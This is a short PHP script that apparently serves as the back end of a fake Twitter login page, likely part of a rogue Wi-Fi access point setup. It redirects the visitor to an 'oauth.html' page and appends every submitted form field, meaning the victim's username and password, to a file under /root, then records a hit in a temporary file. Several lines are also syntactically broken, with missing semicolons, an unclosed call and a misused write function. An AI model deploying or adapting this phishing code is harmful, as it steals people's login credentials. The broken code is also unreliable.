:<?php
header("Location: oauth.html");
$handle = fopen("/root/Twitterusers.txt", "a");
foreach($_POST as $variable => $value) {
fwrite("Essid =", $essid );
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fclose($handle);
$hit1 = fopen("/tmp/TEMPares/hit.txt", "w+")
fclose($hit1);
$hit2 = fopen("/tmp/TEMPares/hit.txt", "a")
fwrite($hit2,"attempts at /root/Twitterusers.txt" 
fclose($hit2);
exit;
?> 
